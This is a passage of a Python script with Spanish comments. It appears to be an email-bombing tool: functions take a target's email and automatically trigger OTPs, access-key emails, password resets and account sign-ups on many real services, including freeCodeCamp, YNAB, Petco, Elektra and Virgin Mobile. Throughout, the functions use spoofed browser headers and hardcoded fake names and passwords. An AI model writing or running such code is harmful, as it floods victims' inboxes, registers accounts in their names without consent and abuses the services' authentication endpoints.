        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m.content_type  # Establece el tipo de contenido multipart/form-data automáticamente
    }

    try:
        # Realizamos la solicitud POST con el cuerpo multipart y las cookies gestionadas por la sesión
        response_post = session.post(url_post, headers=headers_post, data=m)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Clave de acceso enviada a {user} en Gandhi!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la clave de acceso para {user} en Gandhi: {str(e)}"

def enviar_nanopay(user):
    # URL para la solicitud POST
    url_post = "https://api.nanopay.mx/ucenter/api/v2/sendH5Otp"
    
    # Contenido del cuerpo de la solicitud (en formato JSON)
    data_post = {
        "accessToken": None,  # El valor de accessToken está establecido en None
        "feedRecordId": None,  # El valor de feedRecordId está establecido en None
        "appVersionCode": 159,  # Versión de la aplicación (constante)
        "email": user,  # Correo electrónico del usuario (variable)
        "smsType": 1,  # Tipo de SMS (constante)
        "formTips": False,  # Si se muestran consejos en el formulario (constante)
        "clientType": "marketing"  # Tipo de cliente (constante)
    }

    # Headers para la solicitud POST
    headers_post = {
        "Host": "api.nanopay.mx",
        "Origin": "https://nanopay.mx",
        "platform": "h5",
        "Referer": "https://nanopay.mx/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }

    try:
        # Realizamos la solicitud POST para enviar el OTP a través de NanoPay
        response_post = requests.post(url_post, headers=headers_post, data={"data": json.dumps(data_post)})

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡OTP enviado exitosamente a {user} a través de NanoPay!"

    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar OTP a {user} a través de NanoPay: {str(e)}"

def enviar_codigo_freecodecamp(user):
    # URL para la solicitud POST
    url_post = "https://auth.freecodecamp.org/passwordless/start"

    # Contenido del cuerpo de la solicitud (en formato JSON)
    data_post = {
        "client_id": "aUDv9jVqTfxBRE1l60NA5Af7yTCGE4cy",  # client_id de la aplicación
        "connection": "email",  # Establecemos la conexión como "email"
        "send": "code",  # Enviar un código
        "email": user,  # Correo electrónico del usuario (variable)
        "authParams": {
            "response_type": "code",  # Tipo de respuesta
            "redirect_uri": "https://api.freecodecamp.org/auth/auth0/callback",  # URI de redirección
            "scope": "openid profile email",  # Alcance de la autorización
            "audience": "https://auth.freecodecamp.org/userinfo",  # Audiencia para la autorización
            "_csrf": "wceyleT5-olkLR-rp3c_weUFLdYDXmVv-1E4",  # Token CSRF (esto podría necesitar ser actualizado)
            "state": "hKFo2SA4dmZJUDdUZmFhWmpSUXJSc1JGN1pKX2J1U2FzVFh5aaFupWxvZ2luo3RpZNkgdktPaVNSYmU0UUpFTk9iUlhYYlI3UExzU1JUU19CeTWjY2lk2SBhVUR2OWpWcVRmeEJSRTFsNjBOQTVBZjd5VENHRTRjeQ",  # Estado para CSRF
            "_intstate": "deprecated"  # Estado interno (puede que sea obsoleto)
        }
    }

    # Headers para la solicitud POST
    headers_post = {
        "Content-Type": "application/json",  # El tipo de contenido es JSON
        "Origin": "https://auth.freecodecamp.org",  # El origen de la solicitud
        "Referer": "https://auth.freecodecamp.org/login?state=hKFo2SBEaEp6V0tJb283U3dLNkg3WWFaNGUyd18xb1BISVJ6V6FupWxvZ2luo3RpZNkgTTlzRmtGOFZvS0RDRzBtZUl4YV9ya0RObU9IcWlENFOjY2lk2SBhVUR2OWpWcVRmeEJSRTFsNjBOQTVBZjd5VENHRTRjeQ&client=aUDv9jVqTfxBRE1l60NA5Af7yTCGE4cy&protocol=oauth2&response_type=code&redirect_uri=https%3A%2F%2Fapi.freecodecamp.org%2Fauth%2Fauth0%2Fcallback&scope=openid%20profile%20email",  # Referer de la solicitud
        "sec-ch-ua": "\" Not;A Brand\";v=\"99\", \"Microsoft Edge\";v=\"97\", \"Chromium\";v=\"97\"",  # Cabecera de agente de usuario (simula navegador)
        "sec-ch-ua-mobile": "?0",  # Indica que no es móvil
        "sec-ch-ua-platform": "\"Windows\"",  # Plataforma de Windows
        "sec-fetch-dest": "empty",  # Destino de la solicitud
        "sec-fetch-mode": "cors",  # Modo CORS
        "sec-fetch-site": "same-origin",  # Solicitud de mismo origen
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55"  # Agente de usuario de navegador
    }

    try:
        # Realizamos la solicitud POST para enviar el código a través de FreeCodeCamp
        response_post = requests.post(url_post, headers=headers_post, json=data_post)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Código enviado exitosamente a {user} a través de FreeCodeCamp!"

    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el código a {user} a través de FreeCodeCamp: {str(e)}"


def enviar_registro_outdooractive(user):
    # URL para la solicitud POST
    url_post = "https://www.outdooractive.com/es/community.register.ctrl"

    # Contenido de la solicitud en formato "application/x-www-form-urlencoded"
    data_post = {
        "l": "310",  # Valor de "l" (probablemente ID del sitio o formulario)
        "cms.60396": user,  # El correo electrónico del usuario (variable)
        "pass1": "deja27y_o259d%40gexik.com",  # Contraseña (predefinida en el ejemplo)
        "cms.60399": "juan",  # Nombre del usuario (predefinido)
        "cms.60400": "perez",  # Apellido del usuario (predefinido)
        "cms.60398": "Herr",  # Otro dato (predefinido)
        "cms.-3586581046666718462": "1002960",  # ID del usuario o proyecto (predefinido)
        "agb": "true",  # Aceptación de los términos (constante)
        "userConfirm": "true",  # Confirmación del usuario (constante)
        "newsletterOverAvianCarriers": "false",  # Suscripción a la newsletter (constante)
        "projectx": "outdooractive",  # Proyecto en uso (constante)
        "async": "true"  # Async para procesar en segundo plano (constante)
    }

    # Convertir los datos en formato x-www-form-urlencoded
    data_encoded = urllib.parse.urlencode(data_post)

    # Headers para la solicitud POST
    headers_post = {
        "Content-Type": "application/x-www-form-urlencoded",  # Tipo de contenido
        "Origin": "https://www.outdooractive.com",  # El origen de la solicitud
        "Referer": "https://www.outdooractive.com/es/community/register.html",  # Página de referencia
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"",  # Cabecera del navegador
        "sec-ch-ua-mobile": "?0",  # Indica que no es móvil
        "sec-ch-ua-platform": "\"Windows\"",  # Plataforma de Windows
        "sec-fetch-dest": "empty",  # Destino de la solicitud
        "sec-fetch-mode": "cors",  # Modo CORS
        "sec-fetch-site": "same-origin",  # Solicitud de mismo origen
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"  # Agente de usuario del navegador
    }

    try:
        # Realizamos la solicitud POST
        response_post = requests.post(url_post, headers=headers_post, data=data_encoded)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Registro exitoso para {user} en OutdoorActive!"

    except requests.exceptions.RequestException as e:
        return f"Error al intentar registrar a {user} en OutdoorActive: {str(e)}"

def registrar_strikingly(user):
    # URL para la solicitud POST
    url_post = "https://es.strikingly.com/s/users.jsm"

    # Contenido de la solicitud en formato "application/x-www-form-urlencoded"
    data_post = {
        "utf8": "✓",  # Indicador utf8
        "user[profile_attributes][first_name]": "JUAN PEREZ",  # Nombre del usuario (predefinido)
        "user[email]": user,  # Correo electrónico del usuario (variable)
        "user[password_dummy]": "",  # Contraseña vacía
        "user[password]": "deja27y_o259d@gexik.com",  # Contraseña del usuario (predefinida)
        "user[mixpanel_id]": "18125b51d8b821-033959f95e3bd7-15373079-106296-18125b51d8c37",  # ID de Mixpanel (constante)
        "commit": "Comienza. ¡Es gratis!"  # Texto del botón (constante)
    }

    # Convertir los datos en formato x-www-form-urlencoded
    data_encoded = urllib.parse.urlencode(data_post)

    # Headers para la solicitud POST
    headers_post = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",  # Tipo de contenido
        "Origin": "https://es.strikingly.com",  # El origen de la solicitud
        "Referer": "https://es.strikingly.com/s/login",  # Página de referencia
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",  # Cabecera del navegador
        "sec-ch-ua-mobile": "?0",  # Indica que no es móvil
        "sec-ch-ua-platform": "\"Windows\"",  # Plataforma de Windows
        "sec-fetch-dest": "empty",  # Destino de la solicitud
        "sec-fetch-mode": "cors",  # Modo CORS
        "sec-fetch-site": "same-origin",  # Solicitud de mismo origen
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",  # Agente de usuario del navegador
        "x-requested-with": "XMLHttpRequest"  # Indicador de que la solicitud es AJAX
    }

    try:
        # Realizamos la solicitud POST
        response_post = requests.post(url_post, headers=headers_post, data=data_encoded)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Registro exitoso para {user} en Strikingly!"

    except requests.exceptions.RequestException as e:
        return f"Error al intentar registrar a {user} en Strikingly: {str(e)}"

def enviar_heb(user):
    # URL para la solicitud POST
    url_post = "https://heb-cms-prod.eastus.cloudapp.azure.com/auth/signup"

    # Datos en formato JSON para enviar en la solicitud
    data_post = {
        "first_name": "juan",  # Nombre del usuario (predefinido)
        "last_name": "perez",  # Apellido del usuario (predefinido)
        "username": user,  # Nombre de usuario (variable)
        "password": "Gearsofwar3@"  # Contraseña del usuario (predefinida)
    }

    # Headers para la solicitud POST
    headers_post = {
        "Content-Type": "application/json",  # Tipo de contenido
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",  # Agente de usuario del navegador
        "Pragma": "no-cache",  # Instrucción de no cache
        "Accept": "*/*"  # Acepta cualquier tipo de respuesta
    }

    try:
        # Realizamos la solicitud POST
        response_post = requests.post(url_post, headers=headers_post, json=data_post)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        return f"¡Registro exitoso para {user} en HEB!"

    except requests.exceptions.RequestException as e:
        return f"Error al intentar registrar a {user} en HEB: {str(e)}"

def start_elektra_login(user):
    # URL para la solicitud POST para iniciar sesión en Elektra
    url_startlogin = "https://www.elektra.mx/api/vtexid/pub/authentication/startlogin"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m_startlogin = MultipartEncoder(
        fields={
            "accountName": "elektra",  # Nombre de cuenta (constante)
            "scope": "elektra",  # Alcance de la cuenta (constante)
            "returnUrl": "https://www.elektra.mx/?cmpid=SEM:Google:Sea_Branded_Home_Home:Performance:ResponsiveSearchAd:EKT-GEN-GEN:1:Na-Cluster:LIT&utm_source=LIT_SEM&utm_medium=LIT_GOOGLE&utm_campaign=SEA_Branded_Home_Home&gclid=Cj0KCQiAmeKQBhDvARIsAHJ7mF5fKQon6SUtSvFhOszFaZzI3tNStfswiYgex8OLQKQf0tEz9EYHEy4aAoiqEALw_wcB",  # URL de retorno
            "callbackUrl": "https://www.elektra.mx/api/vtexid/oauth/finish?popup=false",  # URL de callback después de la autenticación (constante)
            "user": user,  # Correo electrónico del usuario (variable)
            "fingerprint": ""  # Huella digital (vacía, se puede añadir más información si es necesario)
        },
        boundary="----WebKitFormBoundaryjIAc6mqqM6elKbVd"  # Definir la frontera (boundary) manualmente
    )
    
    # Headers para la solicitud de inicio de sesión (startlogin)
    headers_startlogin = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m_startlogin.content_type,  # Definir tipo de contenido adecuado para multipart/form-data
        "origin": "https://www.elektra.mx", 
        "referer": "https://www.elektra.mx/?cmpid=SEM:Google:Sea_Branded_Home_Home:Performance:ResponsiveSearchAd:EKT-GEN-GEN:1:Na-Cluster:LIT&utm_source=LIT_SEM&utm_medium=LIT_GOOGLE&utm_campaign=SEA_Branded_Home_Home&gclid=Cj0KCQiAmeKQBhDvARIsAHJ7mF5fKQon6SUtSvFhOszFaZzI3tNStfswiYgex8OLQKQf0tEz9EYHEy4aAoiqEALw_wcB",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "vtex-id-ui-version": "vtex.login@2.52.1/vtex.react-vtexid@4.48.1"
    }

    # Usamos una sesión para manejar cookies
    session = requests.Session()

    try:
        # Realizamos la solicitud POST para iniciar sesión en Elektra con la sesión
        response_startlogin = session.post(url_startlogin, headers=headers_startlogin, data=m_startlogin)
        
        # Verificamos si la respuesta fue exitosa
        response_startlogin.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        print(f"Inicio de sesión exitoso para {user} en Elektra.")
        return session  # Retorna la sesión con las cookies guardadas para usarlas en el siguiente paso
    
    except requests.exceptions.RequestException as e:
        print(f"Error al intentar iniciar sesión para {user} en Elektra: {str(e)}")
        return None  # Si hay un error, retornamos None

def send_elektra_access_key(user, session):
    if session is None:
        return "No se pudo obtener una sesión válida. El proceso no continuará."

    # URL para la solicitud POST para enviar la clave de acceso
    url_post = "https://www.elektra.mx/api/vtexid/pub/authentication/accesskey/send"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m = MultipartEncoder(
        fields={
            "email": user,  # Correo electrónico del usuario (variable)
            "locale": "es-MX",  # Localización (constante)
            "recaptcha": "",  # Valor recaptcha (vacío)
        },
        boundary="----WebKitFormBoundaryZa4buOi7KF5McpBk"  # Definir la frontera (boundary) manualmente
    )

    # Headers para la solicitud POST para enviar la clave de acceso
    headers_post = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m.content_type,  # Establece el tipo de contenido multipart/form-data automáticamente
        "origin": "https://www.elektra.mx",
        "referer": "https://www.elektra.mx/?cmpid=SEM:Google:Por-Fin-Es-Junio:Performance:ResponsiveSearchAd:EKT-GEN-GEN:1:Na-Cluster:LIT&utm_source=LIT_SEM&utm_medium=LIT_GOOGLE&utm_campaign=POR-FIN-ES-JUNIO&gclid=Cj0KCQjw2MWVBhCQARIsAIjbwoMT7FkhlVV_J8t5JI6efu5jPFP9qBHsewBYuVoufPXlzgKZ2udaoBkaAp-uEALw_wcB",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "vtex-id-ui-version": "vtex.login@2.52.1/vtex.react-vtexid@4.49.0"
    }

    try:
        # Realizamos la solicitud POST con el cuerpo multipart y las cookies gestionadas por la sesión
        response_post = session.post(url_post, headers=headers_post, data=m)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Clave de acceso enviada a {user} en Elektra!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la clave de acceso para {user} en Elektra: {str(e)}"

def start_doto_login(user):
    # URL para la solicitud POST para iniciar sesión en Doto
    url_startlogin = "https://www.doto.com.mx/api/vtexid/pub/authentication/startlogin"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m_startlogin = MultipartEncoder(
        fields={
            "accountName": "doto",  # Nombre de cuenta (constante)
            "scope": "doto",  # Alcance de la cuenta (constante)
            "returnUrl": "https://www.doto.com.mx/?gclid=CjwKCAjw2P-KBhByEiwADBYWCuIoayV0lwFK1zYWTzM3CD9kpfB2kLBgM4uBBTEP1babpGC_02Q8xxoCqtwQAvD_BwE",  # URL de retorno
            "callbackUrl": "https://www.doto.com.mx/api/vtexid/oauth/finish?popup=false",  # URL de callback después de la autenticación (constante)
            "user": user,  # Correo electrónico del usuario (variable)
            "fingerprint": ""  # Huella digital (vacía, se puede añadir más información si es necesario)
        },
        boundary="----WebKitFormBoundarysyzBNvClqgiT3atR"  # Definir la frontera (boundary) manualmente
    )
    
    # Headers para la solicitud de inicio de sesión (startlogin)
    headers_startlogin = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m_startlogin.content_type,  # Definir tipo de contenido adecuado para multipart/form-data
        "origin": "https://www.doto.com.mx", 
        "referer": "https://www.doto.com.mx/?gclid=CjwKCAjw2P-KBhByEiwADBYWCuIoayV0lwFK1zYWTzM3CD9kpfB2kLBgM4uBBTEP1babpGC_02Q8xxoCqtwQAvD_BwE",
        "sec-ch-ua": "\"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "vtex-id-ui-version": "vtex.login@2.47.3/vtex.react-vtexid@4.47.0"
    }

    # Usamos una sesión para manejar cookies
    session = requests.Session()

    try:
        # Realizamos la solicitud POST para iniciar sesión en Doto con la sesión
        response_startlogin = session.post(url_startlogin, headers=headers_startlogin, data=m_startlogin)
        
        # Verificamos si la respuesta fue exitosa
        response_startlogin.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        print(f"Inicio de sesión exitoso para {user} en Doto.")
        return session  # Retorna la sesión con las cookies guardadas para usarlas en el siguiente paso
    
    except requests.exceptions.RequestException as e:
        print(f"Error al intentar iniciar sesión para {user} en Doto: {str(e)}")
        return None  # Si hay un error, retornamos None

def send_doto_access_key(user, session):
    if session is None:
        return "No se pudo obtener una sesión válida. El proceso no continuará."

    # URL para la solicitud POST para enviar la clave de acceso
    url_post = "https://www.doto.com.mx/api/vtexid/pub/authentication/accesskey/send"
    
    # Crear los datos de la solicitud como MultipartEncoder
    m = MultipartEncoder(
        fields={
            "email": user,  # Correo electrónico del usuario (variable)
            "locale": "es-MX",  # Localización (constante)
            "recaptcha": "",  # Valor recaptcha (vacío)
        },
        boundary="----WebKitFormBoundary5iL3mu5S15VFnnI0"  # Definir la frontera (boundary) manualmente
    )

    # Headers para la solicitud POST para enviar la clave de acceso
    headers_post = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": m.content_type,  # Establece el tipo de contenido multipart/form-data automáticamente
        "origin": "https://www.doto.com.mx",
        "referer": "https://www.doto.com.mx/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"102\", \"Google Chrome\";v=\"102\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "vtex-id-ui-version": "vtex.login@2.52.1/vtex.react-vtexid@4.49.0"
    }

    try:
        # Realizamos la solicitud POST con el cuerpo multipart y las cookies gestionadas por la sesión
        response_post = session.post(url_post, headers=headers_post, data=m)

        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Clave de acceso enviada a {user} en Doto!"
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la clave de acceso para {user} en Doto: {str(e)}"

def registrar_macstore(user):
    # URL para la solicitud POST
    url_post = "https://www.macstoreonline.com.mx/login/RegistarCuenta"
    
    # Datos a enviar en formato JSON
    data = {
        'nombre': 'juan',
        'apellidos': 'perez',
        'email': user,  # Se reemplaza por el correo proporcionado
        'contraseña': 'Gearsofwar3@',  # Contraseña estática en este ejemplo
        'fechanacimiento': '2000-01-14',
        'genero': 'M',
        'news': '1',  # '1' para recibir noticias
        'terminos': '1'  # '1' para aceptar los términos
    }
    
    # Configuración de los encabezados
    headers_post = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Pragma': 'no-cache',
        'Accept': '*/*',
        'Content-Type': 'application/json; charset=UTF-8'
    }

    try:
        # Enviar la solicitud POST con los datos JSON y los encabezados
        response_post = requests.post(url_post, headers=headers_post, data=json.dumps(data))
        
        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        # Mostrar la respuesta de la solicitud
        print(f"Respuesta: {response_post.text}")
        return response_post.json()  # Regresamos el JSON de la respuesta, si es posible
    
    except requests.exceptions.RequestException as e:
        return f"Error al intentar registrar la cuenta en MacStore para {user}: {str(e)}"

def registrar_clip(user):
    # URL para la solicitud POST
    url_post = "https://api-gw.payclip.com/onboarding/signup"
    
    # Datos a enviar en formato JSON
    data = {
        "type": "EXTERNAL",
        "version_flow": "EMAIL_FLOW",
        "email": user,  # Correo del usuario
        "password": "Gearsofwar3@"  # Contraseña estática en este ejemplo
    }
    
    # Configuración de los encabezados
    headers_post = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",  # Tipo de contenido
        "Content-Length": str(len(json.dumps(data)))  # Longitud del contenido en el cuerpo
    }

    try:
        # Realizamos la solicitud POST con los datos JSON y los encabezados
        response_post = requests.post(url_post, headers=headers_post, data=json.dumps(data))
        
        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        # Mostrar la respuesta de la solicitud
        print(f"Respuesta: {response_post.text}")
        return response_post.json()  # Regresamos el JSON de la respuesta, si es posible
    
    except requests.exceptions.RequestException as e:
        if e.response:
            print(f"Error al intentar registrar la cuenta en Payclip para {user}: {e.response.status_code} - {e.response.text}")
        else:
            print(f"Error al intentar registrar la cuenta en Payclip para {user}: {str(e)}")

def registrar_puntoferta(user):
    # URL para la solicitud POST
    url_post = "https://api.puntoferta.com.mx/API/V1.0/clients/create"
    
    # Datos a enviar en formato JSON
    data = {
        "name": "juaan",  # Nombre estático
        "surname": "perez",  # Primer apellido estático
        "surname2": "lopez",  # Segundo apellido estático
        "email": user,  # Correo del usuario
        "passwd": "Gearsofwar3@",  # Contraseña
        "passwdCf": "Gearsofwar3@",  # Confirmación de la contraseña
        "gender": "1",  # Género (1 para masculino, por ejemplo)
        "date": "2000-11-11",  # Fecha de nacimiento
        "from": "appweb"  # Origen de la solicitud
    }
    
    # Configuración de los encabezados
    headers_post = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",  # Tipo de contenido
        "Content-Length": str(len(json.dumps(data)))  # Longitud del contenido en el cuerpo
    }

    try:
        # Realizamos la solicitud POST con los datos JSON y los encabezados
        response_post = requests.post(url_post, headers=headers_post, data=json.dumps(data))
        
        # Verificamos si la respuesta fue exitosa
        response_post.raise_for_status()  # Lanza un error si la respuesta no es 2xx

        # Mostrar la respuesta de la solicitud
        print(f"Respuesta: {response_post.text}")
        return response_post.json()  # Regresamos el JSON de la respuesta, si es posible
    
    except requests.exceptions.RequestException as e:
        if e.response:
            print(f"Error al intentar registrar la cuenta en Puntoferta para {user}: {e.response.status_code} - {e.response.text}")
        else:
            print(f"Error al intentar registrar la cuenta en Puntoferta para {user}: {str(e)}")

def registrar_ynab(user):
    # Definir la URL y los encabezados para la solicitud
    url_ynab = "https://app.ynab.com/users.json"
    headers_ynab = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "es-ES,es;q=0.9,ru;q=0.8",
        "Connection": "keep-alive",
        "Content-Length": "390",  # Actualiza este valor si cambia el contenido del payload
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "app.ynab.com",
        "Origin": "https://www.ynab.com",
        "Referer": "https://www.ynab.com/our-free-34-day-trial/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "sec-ch-ua": "\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\""
    }

    # Crear el payload para el registro en YNAB
    payload_ynab = {
        "user[email]": user,
        "user[password]": "xixb_hribr70@padye.com",  # Este sería el valor por defecto, puedes cambiarlo
        "user[referral_code]": "",
        "user[referral_email]": "",
        "user[tracking_attributes][browser_flags]": "",
        "user[tracking_attributes][utm_campaign]": "",
        "user[tracking_attributes][utm_content]": "",
        "user[tracking_attributes][utm_medium]": "organic",
        "user[tracking_attributes][utm_source]": "google"
    }

    try:
        # Realizar la solicitud POST para enviar el registro
        response_ynab = requests.post(url_ynab, data=payload_ynab, headers=headers_ynab)
        response_ynab.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Registro enviado a {user} en YNAB!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar el registro a {user} en YNAB: {str(e)}"

def pectov2_restablecer(email):
    # Definir la URL y los encabezados para la solicitud
    url_pectov2 = "https://www.petco.com.mx/petco/en/login/pw/request"
    headers_pectov2 = {
        "origin": "https://www.petco.com.mx",
        "referer": "https://www.petco.com.mx/petco/en/login",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
    }

    # Crear el payload para la solicitud de restablecimiento de contraseña
    payload_pectov2 = {
        "email": email,
        "CSRFToken": "csrf_token"  # Se pasa el token CSRF necesario para la solicitud
    }

    try:
        # Realizar la solicitud POST para enviar el restablecimiento de contraseña
        response_pectov2 = requests.post(url_pectov2, data=payload_pectov2, headers=headers_pectov2)
        response_pectov2.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de restablecimiento de contraseña enviada a {email} en Petco!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de restablecimiento de contraseña a {email} en Petco: {str(e)}"

def virginv22_recuperar_contrasena(user):
    # Definir la URL y los encabezados para la solicitud
    url_virginmobile = "https://app.virginmobile.co/api/securityaccess/users/forgot-password"
    headers_virginmobile = {
        "content-type": "application/json",
        "origin": "https://www.virginmobile.co",
        "referer": "https://www.virginmobile.co/",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }

    # Crear el payload para la solicitud de recuperación de contraseña
    payload_virginmobile = {
        "email": user,  # Email proporcionado por el usuario
        "confirmationAccountUrl": "https://www.virginmobile.co/inicio/cambiar-contrasena"
    }

    try:
        # Realizar la solicitud POST para recuperar la contraseña
        response_virginmobile = requests.post(url_virginmobile, json=payload_virginmobile, headers=headers_virginmobile)
        response_virginmobile.raise_for_status()  # Lanza un error si la respuesta no es 2xx
        
        return f"¡Solicitud de recuperación de contraseña enviada a {user} en Virgin Mobile!"
    except requests.exceptions.RequestException as e:
        return f"Error al intentar enviar la solicitud de recuperación de contraseña a {user} en Virgin Mobile: {str(e)}"

